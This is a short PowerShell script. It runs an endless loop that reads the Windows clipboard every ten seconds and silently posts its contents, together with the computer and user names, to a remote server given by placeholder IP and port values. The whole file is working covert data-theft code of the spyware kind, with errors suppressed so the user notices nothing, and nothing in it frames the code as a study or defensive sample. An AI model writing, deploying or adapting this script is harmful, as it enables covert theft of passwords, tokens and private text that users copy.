Add-Type -AssemblyName System.Windows.Forms

$ip = "IP_ADDRESS"
$port = "PORT_NUMBER"
$url = "http://${ip}:${port}/index.php"

while ($true) {
    try {
        $clipText = [System.Windows.Forms.Clipboard]::GetText()
        if ($clipText -and $clipText.Trim()) {
            $body = @{
                clipboard_data = $clipText
                machine_name = $env:COMPUTERNAME
                user_name = $env:USERNAME
            }
            Invoke-RestMethod -Uri $url -Method Post -Body $body -ErrorAction SilentlyContinue
        }
    } catch { }
    Start-Sleep -Seconds 10
}
